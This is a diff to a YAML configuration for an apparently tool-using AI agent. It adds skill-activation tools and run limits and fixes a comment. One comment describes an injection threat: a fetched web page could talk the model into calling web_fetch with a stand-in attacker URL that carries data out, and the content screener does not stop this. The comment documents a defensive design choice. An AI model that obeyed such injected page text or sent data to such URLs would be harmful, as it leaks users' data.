@@ -35,6 +35,8 @@ spec:
   tools:
     - calculator
     - list_skills
+    - activate_skill
+    - deactivate_skill
 
   # Guidance for the retrieval pair, appended to the prompt only while each tool is bound —
   # it used to live in `system_prompt`, where removing `web_fetch` would have left the prompt
@@ -79,7 +81,7 @@ spec:
   # Read what this does and does not cover. It screens what comes *back*; the URL the model
   # hands to `web_fetch` passes through no screener, so a page that talks the model into
   # `web_fetch("https://attacker/?d=…")` is not stopped here. That is why inbound auth is on
-  # above, and why an operator wanting a stronger control sets `model:` and `on_flag: block`.
+  # below, and why an operator wanting a stronger control sets `model:` and `on_flag: block`.
   content_screening:
     enabled: true
     on_flag: quarantine
@@ -93,6 +95,12 @@ spec:
   # on every later turn.
   artifacts:
     enabled: true
+
+  # Authenticated, but `web_fetch` reaches any host and every fetch is a paid extraction call,
+  # so a run's calls and time are bounded well inside the install-wide defaults.
+  limits:
+    max_tool_calls: 150
+    max_wall_clock_seconds: 1800
 
   auth:
     inbound:
